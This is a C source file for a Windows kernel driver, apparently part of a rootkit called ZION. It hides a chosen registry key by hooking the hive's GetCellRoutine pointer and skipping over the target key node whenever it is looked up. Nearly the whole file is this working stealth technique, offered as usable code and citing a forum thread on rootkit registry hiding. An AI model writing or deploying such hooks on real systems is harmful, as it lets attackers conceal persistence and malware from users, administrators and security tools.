/*
 *      name: ZION system File Hive Register kernel
 *      Org Author: Liang Chen
 *		Reference: Pediy: 也谈rootkit 注册表信息隐藏，http://bbs.pediy.com/showthread.php?p=444198&mode=threaded
 *      Version : 0.2
 */
#pragma once
#include "zion_hive_register_routine_impl.h"

PGET_CELL_ROUTINE zion_pGetCellRoutine = NULL;
PGET_CELL_ROUTINE* zion_ptrGetCellRoutine = NULL;

PCM_KEY_NODE zion_HideNode = NULL;
PCM_KEY_NODE zion_LastNode = NULL;

BOOL Hive_Registry_SERVER(PVOID ptrBufferAddr)
{
	PVOID ptrProxyHivePacketData = ExAllocatePool(
												PagedPool,
												sizeof(ZION_HIVE_REG_HOOK_CMD_DATA)
												);

	if (NULL == ptrProxyHivePacketData)
	{
		safe_trace("ZION_SERVER: alloc memory error.\n");
		return 0;
	}
	if (1 != Safe_CopyMemFromUser((PZION_HIVE_REG_HOOK_CMD_DATA)((PZION_CS_PACKET)ptrBufferAddr)->pData,
						   sizeof(ZION_HIVE_REG_HOOK_CMD_DATA),
						   ptrProxyHivePacketData))
	{
		safe_trace("ZION_SERVER: Copy Data error.\n");
		return 0;
	}
	if (1 != HideRegistryByHookHiveRoutine(((PZION_HIVE_REG_HOOK_CMD_DATA)ptrProxyHivePacketData)->RegKeyPath))
	{
		safe_trace("ZION_SERVER: Hide Registry error.\n");
		return 0;
	}
	
	ExFreePool(ptrProxyHivePacketData);
	return 1;
}
BOOL HideRegistryByHookHiveRoutine(WCHAR * RegKeyPath)
{
	UNICODE_STRING wcsRegPath;
	OBJECT_ATTRIBUTES m_oa;
	HANDLE HidenKey;
	PCM_KEY_BODY KeyBody;
	PVOID KCB;
	PHHIVE Hive;
	NTSTATUS status;
	RtlInitUnicodeString(&wcsRegPath, RegKeyPath);
	InitializeObjectAttributes(&m_oa, &wcsRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	//初始化对象属性
	status = ZwOpenKey(&HidenKey, 0x80000000, &m_oa);//获得键句柄
	if (!NT_SUCCESS(status))
    {
        safe_trace("ZION_SERVER: Open Key error.\n");
		return FALSE;
    }
	status = ObReferenceObjectByHandle(HidenKey, 0x80000000, NULL, KernelMode, &KeyBody, NULL);
	//获得键对象体
    if (!NT_SUCCESS(status))
    {
         safe_trace("ZION_SERVER: Open Object error.\n");
         return FALSE;
    }
    KCB = KeyBody->KeyControlBlock;
    if (NULL == KCB)
	{
		safe_trace("ZION_SERVER: KCB NULL error.\n");
        return FALSE;
	}
    ObDereferenceObject(KeyBody);
	Hive = (PHHIVE)(*(PVOID *)((ULONG)KCB + HIVE_ADDRESS_OFFSET));
    zion_ptrGetCellRoutine = &(Hive->GetCellRoutine);
    zion_pGetCellRoutine = Hive->GetCellRoutine;//备份原始指针
    zion_HideNode = (PCM_KEY_NODE)zion_pGetCellRoutine(Hive, *(PVOID *)((ULONG)KCB + CELL_ADDRESS_OFFSET));
    Hive->GetCellRoutine = ZionNetGetCellRoutine;
    ZwClose(HidenKey);
    
	return TRUE;
}

PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
       PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)zion_pGetCellRoutine(Hive, Node->Parent);
       PCM_KEY_INDEX Index = (PCM_KEY_INDEX)zion_pGetCellRoutine(Hive, ParentNode->SubKeyLists[0]);
       if (Index->Signature == CM_KEY_INDEX_ROOT)
       {
           Index = (PCM_KEY_INDEX)zion_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
       }

       if (Index->Signature == CM_KEY_FAST_LEAF || Index->Signature == CM_KEY_HASH_LEAF)
       {
           return zion_pGetCellRoutine(Hive, Index->List[2*(Index->Count-1)]);
       }
       else
       {
           return zion_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
       }
}

PVOID ZionNetGetCellRoutine(PVOID Hive, HANDLE Cell)
{
	PVOID dwCellAddr = zion_pGetCellRoutine(Hive, Cell);
	if (NULL == dwCellAddr) return dwCellAddr;
	if (dwCellAddr == zion_HideNode)
	{
		dwCellAddr = zion_LastNode = (PCM_KEY_NODE)GetLastKeyNode(Hive, zion_HideNode);
		if (zion_LastNode == zion_HideNode) dwCellAddr = NULL;
	}
	else if (dwCellAddr == zion_LastNode)
	{
		
		dwCellAddr = zion_LastNode = NULL;
	}

	return dwCellAddr;
}

